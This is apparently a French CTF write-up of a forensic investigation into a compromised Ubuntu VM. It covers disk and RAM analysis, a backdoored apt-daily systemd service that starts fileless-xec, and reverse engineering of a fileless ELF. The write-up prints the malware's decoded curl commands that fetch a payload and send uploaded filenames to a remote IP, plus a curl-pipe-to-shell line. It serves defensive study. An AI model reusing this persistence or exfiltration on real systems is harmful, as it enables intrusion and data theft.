BreizhCTF 2024 - The Intrepid (2/4)
==========================

### Description

**De :** `the-intrepid-journal@notproton.me`  
**À :** `dfir-independant-consulting@notproton.me` (vous)

**Objet :** Re : [`www.dfir-independant-consulting.notcom`] Nouveau contrat : The Intrepid journal

> [...] Je vous recommande d'arrêter temporairement votre application, sans re-déployer la VM. Notre objectif est d'identifier le *modus operandi* de l'intrus, afin de patcher complètement l'environnement. Pourriez-vous me fournir une capture RAM et disque de votre VM ?

Nous vous remercions pour cette première analyse, l'application est temporairement arrêtée, et nous gérons la communication utilisateur de notre côté. Le code source est également intact, aucune porte dérobée n'est présente en son sein.

Aucune trace d'exécution des charges précédemment identifiées n'ont été remarquées sur le système, qui a par ailleurs été malencontreusement redémarré par notre administrateur système, dans une tentative d'expulsion de l'attaquant. Nous ne pouvons vous fournir, comme demandé, qu'une capture RAM post-redémarrage. 
Ne vous étonnez d'ailleurs pas de retrouver quelques unes de ses tentatives d'analyse à chaud, dans les traces.

---

Identifiez :

- Le chemin disque complet, du fichier de persistance, contenant la commande utilisée pour (re)lancer le procédé malveillant
- Le nom de l'outil/wrapper utilisé pour exécuter le processus malveillant
- Le chemin Web, employé par la charge virale, pour transmettre des informations sur les identifiants de partage, à un serveur distant

Format de flag : `BZHCTF{chemin_disque_persistence|nom_outil|chemin_web_vers_serveur}`  
Exemple de flag : `BZHCTF{/home/user/fichier.txt|empire|http://127.0.0.1/my_endpoint}`

### Fichiers fournis

- intrepid.ram.tar.gz
- intrepid.vmdk.tar.gz
- Volatility_ressources.zip

### Persistence

Suite à la première étape, nous savons qu'un acteur malveillant a pu élever ses privilèges en `root` sur le système, et y a exécuté du code. Nous ne disposerons probablement pas des traces d'exécution, mais uniquement du résultat de ces exécutions, et des artefacts sur le système.

L'ordre des informations demandées dans le challenge semble cohérente, nous pouvons ainsi le suivre.

Un fichier `intrepid.vmdk.tar.gz` nous est transmis. Décompressons le : 

```sh
$ tar -xf intrepid.vmdk.tar.gz
$ file intrepid.vmdk                                                        
intrepid.vmdk: VMware4 disk image
$ sha256sum intrepid.vmdk
a60f9262a45e56a8ed9c0bb70ad81fcf6ad9dba2d8bd20bff88e5b5b1edbed8a  intrepid.vmdk
```

Afin d'en analyser le contenu, nous pouvons le monter via l'utilitaire Python [dissect](https://docs.dissect.tools/en/latest/) :

```sh
$ pip3 install dissect
$ mkdir mount
$ sudo target-mount intrepid.vmdk mount
```

Et voilà ! Le disque est monté dans un dossier local, sans devoir passer par des syntaxes Linux obscures :

```sh
$ cd mount/fs
$ ls             
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var
```

Regardons les fichiers communs, présents dans les "HOME" des utilisateurs.

- `/home/vagrant/.bash_history` :

```sh
exit
sudo systemctl stop er-bridge.service
sudo systemctl status er-bridge.service
exit
ps -aux
sudo apt install exa -y
netstat -tlpn
ls
exa
exa -la
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
./les.sh 
history
KNOWN_CODEBASE_SHA256_SUM='835005648de2e288892509da0a6be3514222ec684f956bd3e1451688f9d9131e  -'
[ "$KNOWN_CODEBASE_SHA256_SUM" = "$(cat /var/www/html/app/*.py | sha256sum)" ]; echo $?
# 0
dpkg --verify
sudo tcpdump
sudo tcpdump not port 22
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
python3
exit
```

À première vue, nous pourrions penser que ces commandes fassent partie de la chaîne d'attaque. Néanmoins, il semblerait qu'elles ne soient en réalité que la tentative de détection spécifiée dans la description du challenge. En effet, l'administrateur a essayé de trouver pa lui-même si le système était vulnérable et a également vérifié si le code source de son application n'avait pas été modifié, ce qui n'est pas le cas. Confirmons le avec nos sources : 

```sh
$ cat app/*.py | sha256sum
835005648de2e288892509da0a6be3514222ec684f956bd3e1451688f9d9131e  -
```

La persistence n'est donc pas présente dans le code Python. Via ses privilèges root, l'attaquant a probablement injecté sa persistence dans une tâche récurrente, de type `cron` ou `systemd`. L'excellente ressource https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/ nous donne quelques endroits de persistence à vérifier. Nous pouvons les vérifier un par un, [en listant les fichiers récemment modifiés](https://stackoverflow.com/questions/4561895/how-to-recursively-find-the-latest-modified-file-in-a-directory). Regardons directement l'ensemble du répertoire `etc/` :

```sh
$ find etc/ -type f -printf '%TY-%Tm-%Td %TH:%TM:%Tm %Tz %p\n'| sort -n | sort -r | head -n 10
2024-04-08 00:42:04 +0200 etc/fstab
2024-04-07 23:40:04 +0200 etc/systemd/system/apt-daily.timer
2024-04-07 23:40:04 +0200 etc/systemd/system/apt-daily.service
2024-04-07 23:36:04 +0200 etc/systemd/system/snap-snapd-21184.mount
2024-04-07 23:36:04 +0200 etc/systemd/system/snap-core20-2182.mount
2024-04-07 23:03:04 +0200 etc/systemd/system/er-bridge.service
2024-04-07 23:03:04 +0200 etc/shadow
2024-04-07 23:02:04 +0200 etc/shadow-
2024-04-07 23:02:04 +0200 etc/passwd-
2024-04-07 23:02:04 +0200 etc/passwd
```

Bien qu'aucun nom de fichier "flashy" ne ressorte, la modification simultanée de deux fichiers liés au service `apt-daily` est intriguante. Inspectons leurs contenus : 

```sh
$ cat etc/systemd/system/apt-daily.timer
[Unit]
Description=Daily apt download activities

[Timer]
OnCalendar=*-*-* 23:58
Persistent=true

[Install]
WantedBy=timers.target%
```

Ce fichier régit l'horaire d'exécution du service. Bien que rien ne semble suspect, nous pouvons le comparer avec un original (soit présent sur notre machine, soit disponible [en ligne](https://askubuntu.com/questions/1443080/how-to-control-when-daily-automatic-update-happens)) :

```sh
$ diff /etc/systemd/system/apt-daily.timer etc/systemd/system/apt-daily.timer
5,6c5
< OnCalendar=*-*-* 6,18:00
< RandomizedDelaySec=12h
---
> OnCalendar=*-*-* 23:58
```

L'horaire d'exécution a été mise à `23h58`, soit environ 20 minutes après la modification du fichier. Regardons désormais le fichier de service :

```sh
$ cat etc/systemd/system/apt-daily.service                                                    
[Unit]
Description=Daily apt download activities
Documentation=man:apt(8)
ConditionACPower=true
After=network.target network-online.target systemd-networkd.service NetworkManager.service connman.service

[Service]
Type=oneshot
ExecStartPre=-/usr/lib/apt/apt-helper wait-online
ExecStart=/usr/lib/apt/apt.systemd.daily update
ExecStartPost=/usr/bin/apt-clean clean -n 'sshd: vagrant [priv]'%
```

Trois commandes sont exécutées : 

- `/usr/lib/apt/apt-helper wait-online`
- `/usr/lib/apt/apt.systemd.daily update`
- `/usr/bin/apt-clean clean -n 'sshd: vagrant [priv]'%`

Le paramètre de la dernière commande attire notre attention : `-n 'sshd: vagrant [priv]'%`. Effectuons de nouveau un `diff` avec un original du fichier de service :

```sh
$ diff /etc/systemd/system/apt-daily.service etc/systemd/system/apt-daily.service
10c10,11
< ExecStart=/usr/lib/apt/apt.systemd.daily update
\ No newline at end of file
---
> ExecStart=/usr/lib/apt/apt.systemd.daily update
> ExecStartPost=/usr/bin/apt-clean clean -n 'sshd: vagrant [priv]'
\ No newline at end of file
```

La ligne `ExecStartPost` semble avoir été ajoutée, pour exécuter le binaire `/usr/bin/apt-clean`. En le cherchant sur le Web, ou tout simplement sur sa machine (si `apt` est présent), on se rend compte que ce n'est pas un binaire courant.

### Analyse du binaire suspicieux

Regardons rapidement à quel type de binaire nous avons affaire :

```sh
$ file usr/bin/apt-clean                                                                      
usr/bin/apt-clean: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=34Yq5oAiZs8PWaGQjVX7/got1pNXHE59IZev8ckuD/Eq2tXoLJGTzPZzUbbPcd/SswM6R7SpRgEov0tc9A8, stripped
$ ls -lh usr/bin/apt-clean
-rwxr-xr-x 1 root root 9,1M Aug  2  2023 usr/bin/apt-clean
$ sha256sum usr/bin/apt-clean 
810ea2a86b3749cab842d48c90cdf9694a763dead8fd98ffa24bf4159ac5a57f  usr/bin/apt-clean
```

Une première analyse manuelle dans les `strings` nous révèle des informations intéressantes :

```sh
# Capture les strings ayant une longueur minimum de 7, sans doublon
$ strings -n 7 usr/bin/apt-clean | uniq -u > /tmp/strings.txt
```

On identifie par exemple :

```
/project/vendor/github.com/quic-go/quic-go/internal/protocol/connection_id.go
/project/vendor/github.com/quic-go/quic-go/internal/protocol/encryption_level.go
/project/vendor/github.com/quic-go/quic-go/internal/protocol/key_phase.go
/project/vendor/github.com/quic-go/quic-go/internal/protocol/packet_number.go
/project/vendor/github.com/quic-go/quic-go/internal/protocol/perspective.go
```

Il s'agit d'un binaire développé en langage `go`, et étant souvent difficiles à analyser via des outils tels que `ghidra` ou `ida`, il est pour l'instant plus intéressant de continuer à étudier les `strings`. Une bonne technique pour voir si le binaire est déjà connu, est de chercher les chemins `go` sur le Web. En scrollant dans le fichier, on peut également remarquer des références à des projets sur `github.com`. 

La description du challenge mentionne qu'un outil a été utilisé pour exécuter un autre procédé malveillant, avec comme exemple le C2 [merlin](https://github.com/Ne0nd0g/merlin). Si `apt-clean` se révèle être un outil similaire, alors il est fort probable qu'il soit disponible sur GitHub. Affinons les recherches : 


```sh
# Ne garder que les lignes commençant par "github.com", sans doublon
$ grep '^github.com/' /tmp/strings.txt | uniq -u > /tmp/strings_github.txt
```

En début de fichier, nous remarquons : 

```
github.com/ariary/fileless-xec/pkg/exec.UnstealthyExec.func4
github.com/ariary/fileless-xec/pkg/exec.UnstealthyExec.func3
github.com/ariary/fileless-xec/pkg/exec.UnstealthyExec.func2
github.com/ariary/fileless-xec/pkg/exec.UnstealthyExec.func1
```

Comme supposé, cela fait référence à un projet GitHub, permettant ici l'exécution de binaires via la technique `fileless` : https://github.com/ariary/fileless-xec. Voici [une brève introduction à cette technique](https://unprotect.it/technique/fileless-mechanisms/) :

> Fileless malware is a type of malware that is designed to reside and execute entirely in the memory of a host system, without leaving any trace on the local disk. This can make it more difficult for security tools to detect and remove the malware, as it does not leave any files on the system that can be scanned or deleted.

Dans le "README" du projet, nous pouvons lire : 

> execute binary with specified program name: fileless-xec -n /usr/sbin/sshd [binary_url]

Cela ressemble fortement à `ExecStartPost=/usr/bin/apt-clean clean -n 'sshd: vagrant [priv]'`, confirmant nos suspicions. Le service situé à `/etc/systemd/system/apt-daily.service` est donc utilisé pour relancer l'appel au binaire `fileless-xec`. Désormais, il nous faut aller voir en mémoire pour obtenir la suite des informations.

### Analyse mémoire

Commençons par mettre en place l'environnement Volatility, avec les ressources fournies. Ici, l'installation de Volatility2 et Volatility3 ne sera pas détaillée :

```sh
$ unzip Volatility_ressources.zip -d Volatility_ressources

# Copie de l'ISF Volatility3, contenant les symbols appropriés pour analyser intrepid.ram
$ cp Volatility_ressources/Ubuntu_5.15.0-83-generic_5.15.0-83.92_amd64_vol3.json.xz ~/volatility3/volatility3/symbols/linux/

# Copie du profil Volatility2
$ cp Volatility_ressources/Ubuntu_5.15.0-83-generic_5.15.0-83.92_amd64_vol2.zip ~/volatility2/volatility/plugins/overlays/linux/

# Application du patch Volatility2
$ cp Volatility_ressources/vol2_patch.diff ~/volatility2/
$ cd ~/volatility2/
$ git apply vol2_patch.diff 
vol2_patch.diff:102: trailing whitespace.
        
vol2_patch.diff:109: trailing whitespace.
        
warning: 2 lines add whitespace errors.
```

Grâce à notre analyse de disque, nous pouvons directement commencer à chercher des processus comportant le nom "sshd" :

```sh
$ vol3 -f intrepid.ram linux.pslist | grep 'sshd'
# OFFSET (V)      PID     TID     PPID    COMM    File output
0x918258150000  928     928     1       sshd    Disabled
0x91825340e600  1827    1827    928     sshd    Disabled
0x918254a64c80  1878    1878    1827    sshd    Disabled
0x91826fc63300  28587   28587   928     sshd    Disabled
0x91824f359980  28639   28639   28587   sshd    Disabled
```

```sh
$ vol3 -f intrepid.ram linux.psaux | grep 'sshd'
# PID     PPID    COMM    ARGS
928     1       sshd    sshd: /usr/sbin/ss
1827    928     sshd    sshd: vagrant [priv]
1878    1827    sshd    sshd: vagrant@pts/0 
3791    1       7       sshd: vagrant [priv]
28587   928     sshd    sshd: vagrant [priv]
28639   28587   sshd    sshd: vagrant@pts/1
```

Nous pouvons remarquer une différence sur le nombre de processus listées entre ces deux commandes (5 contre 6). Il semblerait que le processus au pid 3791 n'ait pas été détecté par la première commande, car son attribut `COMM` n'est pas `sshd` mais `7`. Ensuite, les processus `sshd` sont reliés les uns aux autres, par la parenté, à l'exception du pid `3791`.  

Afin de confirmer nos soupçons, nous devons extraire l'exécutable de la mémoire :

```sh
$ mkdir output/
$ vol3 intrepid.ram -o output/ linux.pslist --pid 3791 --dump
Volatility 3 Framework 2.7.0    Stacking attempts finished                  

OFFSET (V)      PID     TID     PPID    COMM    File output

0x918244040000  3791    3791    1       7       Error outputting file
```

Mince ! `linux.pslist` n'arrive pas à extraire le processus... La technique `fileless` employée, ne laissant pas de trace sur le disque, ne permet pas à l'implémentation du plugin de l'extraire. 

Heureusement, en regardant les autres commandes disponibles, nous pouvons voir :

```sh
$ vol3 intrepid.ram -h
# [...]
linux.elfs.Elfs     Lists all memory mapped ELF files for all processes.
# [...]
```

Donnons lui sa chance : 

```sh
$ vol3 intrepid.ram -o output/  linux.elfs --pid 3791 --dump
Volatility 3 Framework 2.7.0    Stacking attempts finished                  

PID     Process Start   End     File Path       File Output

3791    7       0x55a0d4ff0000  0x55a0d4ff1000  /:[8]   pid.3791.7.0x55a0d4ff0000.dmp
3791    7       0x7f67d6ba5000  0x7f67d6bcd000  /usr/lib/x86_64-linux-gnu/libc.so.6     pid.3791.7.0x7f67d6ba5000.dmp
3791    7       0x7f67d6dd5000  0x7f67d6dd7000  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2  pid.3791.7.0x7f67d6dd5000.dmp
3791    7       0x7f67d6e01000  0x7f67d6e0c000  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2  pid.3791.7.0x7f67d6e01000.dmp
3791    7       0x7ffe963c3000  0x7ffe963c5000  [vdso]  pid.3791.7.0x7ffe963c3000.dmp
```

Cette fois ci, nous retrouvons les sections mémoires ELF mappées par l'exécutable. Inspectons leur contenu : 

```sh
$ file output/*
output/pid.3791.7.0x55a0d4ff0000.dmp: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped
output/pid.3791.7.0x7f67d6ba5000.dmp: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter *empty*, stripped
output/pid.3791.7.0x7f67d6dd5000.dmp: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, stripped
output/pid.3791.7.0x7f67d6e01000.dmp: empty
output/pid.3791.7.0x7ffe963c3000.dmp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, missing section headers at 4696
```

Le fichier `pid.3791.7.0x55a0d4ff0000.dmp` semble correspondre à l'exécutable lié au processus :

```sh
$ ls -lh output/pid.3791.7.0x55a0d4ff0000.dmp        
-rw------- 1 xyz xyz 20K May  9 18:55 output/pid.3791.7.0x55a0d4ff0000.dmp
$ sha256sum output/pid.3791.7.0x55a0d4ff0000.dmp                 
b81f9030ab0a44ef9072fcfc116d6186ae191773eac3b11f82fa8a173446d128  output/pid.3791.7.0x55a0d4ff0000.dmp
```

Regardons les strings : 

```
/lib64/ld-linux-x86-64.so.2
%c_>
?sbC
__cxa_finalize
malloc
write
__libc_start_main
inotify_add_watch
inotify_init
pclose
free
system
strlen
lseek
syscall
snprintf
difftime
kill
fread
exit
popen
__stack_chk_fail
fstat
libc.so.6
GLIBC_2.33
GLIBC_2.4
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
w0rmh01eH
ZTRJ
Y]eH
RCRSV
AVEY^
AUDZ^
I already exist.
/var
/var/www/html/app/uploads/
:*3$"
I already exist.
/var
/var/www/html/app/uploads/
:*3$"
```

Nous pouvons remarquer des chaînes de caractères suspectes, faisant référence à l'application er-bridge, dans `/var/www/html/app/uploads/`. Afin de comprendre le comportement du binaire, une séance de reverse engineering statique s'impose.

### Reverse engineering de l'ELF malveillant

Nous utiliserons IDA pour examiner ce binaire, en version gratuite. Voici le code de la fonction `main` : 

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  if ( !(unsigned int)sub_14AD(a1, a2, a3) )
    exit(1);
  sub_1912();
}
```

Une première fonction, situé en 0x14AD est appelée et vérifiée par le programme. En l'inspectant, nous remarquons directement un tableau de caractères déclaré en début de fonction :

```c
*(_QWORD *)command = 0xE421D4801724514LL;
v11 = 0x4A1E0A1819065857LL;
v12 = 0x541F05585C5C024FLL;
v13 = 0xE1E01585C5C0446LL;
v14 = 0x65551F5653401018LL;
v15 = 0x181C1F01;
v16 = 0x5C04;
v17 = 0;
// [...]
sub_13E9(command);
```

Un décodage hexadécimal ne donne rien de probant, signifiant qu'une opération supplémentaire doit probablement être réalisée. La "commande" est passée en paramètre de la fonction située en 0x13E9 :

```c
unsigned __int64 __fastcall sub_13E9(const char *a1)
{
  char v2; // [rsp+17h] [rbp-19h]
  int i; // [rsp+18h] [rbp-18h]
  int v4; // [rsp+1Ch] [rbp-14h]
  __int64 v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v5 = 'e10hmr0w'; // w0rmh01e
  v4 = strlen(a1);
  for ( i = 0; i < v4; ++i )
  {
    v2 = a1[i] ^ *((_BYTE *)&v5 + (i & 7));
    if ( v2 )
      a1[i] = v2;
    else
      a1[i] = a1[i];
  }
  return v6 - __readfsqword(0x28u);
}
```

En examinant cette logique, il est aisé de détecter que le paramètre passé effectue un XOR avec la clé `w0rmh01e`. On peut noter une subtilité ici, car le programme va vérifier que l'opération XOR entre deux caractères ne produit pas 0x00. Si cela se produit, alors le caractère courant reste inchangé et est ajouté à la sortie. Développons un petit script Python pour réaliser le déchiffrement : 


```python
KEY = b"w0rmh01e"

command_parts : list[str] = []
command_parts.append("E421D4801724514")
command_parts.append("4A1E0A1819065857")
command_parts.append("541F05585C5C024F")
command_parts.append("E1E01585C5C0446")
command_parts.append("65551F5653401018")
command_parts.append("181C1F01")
command_parts.append("5C04")

# Integers aren't left padded, so do it here with string manipulation
command = b"".join([bytes.fromhex("0" + c if len(c) % 2 else c)[::-1] for c in command_parts])

result = []
for i, byte in enumerate(command):
    xor_result = byte ^ KEY[i % len(KEY)]
    if xor_result != 0x00:
        result.append(xor_result)
    else:
        result.append(byte)

print(bytearray(result))
```

Résultat : `bytearray(b'curl -sk http://82.105.114.101/ko 2>>/dev/null')`. Cette commande système semble être exécutée lorsque le temps d'exécution de la fonction `kill` sur le PID `9120` prend moins de trois secondes :

```c
time(&timer);
kill(9120, 0xF);
time(&time1);
if ( difftime(time1, timer) < 3.0 )
{
    sub_13E9(command);
    stream = popen(command, "r");
```

Par la suite, le résultat de cette commande semble être stocké dans un fichier : 

```c
fd = open("/var", 0x410002);
```

Gardons ces informations de côté, puis retournons dans la boucle principale pour examiner la deuxième fonction située en 0x1912 :

```c
void __noreturn sub_1912()
{
  int fd; // [rsp+0h] [rbp-8030h]
  char *i; // [rsp+8h] [rbp-8028h]
  ssize_t v2; // [rsp+10h] [rbp-8020h]
  char buf[16]; // [rsp+20h] [rbp-8010h] BYREF
  char v4; // [rsp+30h] [rbp-8000h] BYREF
  __int64 v5[512]; // [rsp+7030h] [rbp-1000h] BYREF

  while ( v5 != (__int64 *)&v4 )
    ;
  v5[0x1FF] = __readfsqword(0x28u);
  fd = inotify_init();
  if ( fd == 0xFFFFFFFF )
    exit(1);
  if ( inotify_add_watch(fd, "/var/www/html/app/uploads/", 0x100u) == 0xFFFFFFFF )
    exit(1);
  while ( 1 )
  {
    v2 = read(fd, buf, 0x8000uLL);
    if ( !v2 )
      break;
    if ( v2 == 0xFFFFFFFFFFFFFFFFLL )
      exit(1);
    for ( i = buf; i < &buf[v2]; i += *((unsigned int *)i + 3) + 0x10 )
    {
      if ( (*((_DWORD *)i + 1) & 0x100) != 0 )
      {
        if ( *((_DWORD *)i + 3) )
          sub_1765(i + 0x10);
      }
    }
  }
  exit(1);
}
```

Outre l'enchevêtrement de `if`, `while` et `for`, une ligne ressort distinctement : 

```c
inotify_add_watch(fd, "/var/www/html/app/uploads/", 0x100u) == 0xFFFFFFFF )
```

Faisons un tour dans le [man linux](https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html) :
>  inotify_add_watch() adds a new watch, or modifies an existing
       watch, for the file whose location is specified in pathname; the
       caller must have read permission for this file.  The fd argument
       is a file descriptor referring to the inotify instance whose
       watch list is to be modified.  The events to be monitored for
       pathname are specified in the mask bit-mask argument.

Cette fonction permet d'accrocher un écouteur d'événement sur la création de fichiers ou dossiers dans une arborescence ! Le chemin spécifié ici correspond à l'emplacement des partages de l'application `et-bridge`, et vient donc faire sens avec l'énoncé du challenge : 

> (Retrouvez) - Le chemin Web, employé par la charge virale, pour transmettre des informations sur les identifiants de partage, à un serveur distant

Enin, une fonction en 0x1765 est appelée. Elle contient deux chaînes de caractères encodées par un XOR, qui produisent (une fois décodés) :

```c
unsigned __int64 __fastcall sub_1765(__int64 a1)
{
  // [...]
  format = "curl -G -d \'file=%s\' -d \'timestamp=%ld\' %s >>/dev/null 2>>/dev/null"
  v3 = "http://82.105.114.101/6e6f7468696e6768657265"
  v5 = 0;
  v2 = time(0LL);
  sub_13E9(format);
  sub_13E9((const char *)v3);
  snprintf(s, 0x200uLL, format, a1, v2, v3);
  system(s);
  return v16 - __readfsqword(0x28u);
}
```

Ici, il est apparent que cette logique permet de transmettre le nom d'un fichier et le timestamp auquel il a été crée, via une requête HTTP "GET" à l'URL `http://82.105.114.101/6e6f7468696e6768657265`.


Pour le moment, nous ne pouvons déterminer l'utilité de transmettre cette information à un serveur distant. En revanche, nous disposons de plusieurs pistes pour la suite de l'investigation, ainsi que d'informations utiles sur des ressources distantes.

### Flag

- Le chemin disque complet, du fichier de persistance, contenant la commande utilisée pour (re)lancer le procédé malveillant : `/etc/systemd/system/apt-daily.service`
- Le nom de l'outil/wrapper utilisé pour exécuter le processus malveillant : `fileless-xec`
- Le chemin Web, employé par la charge virale, pour transmettre des informations sur les identifiants de partage, à un serveur distant : `http://82.105.114.101/6e6f7468696e6768657265`


`BZHCTF{/etc/systemd/system/apt-daily.service|fileless-xec|http://82.105.114.101/6e6f7468696e6768657265}`
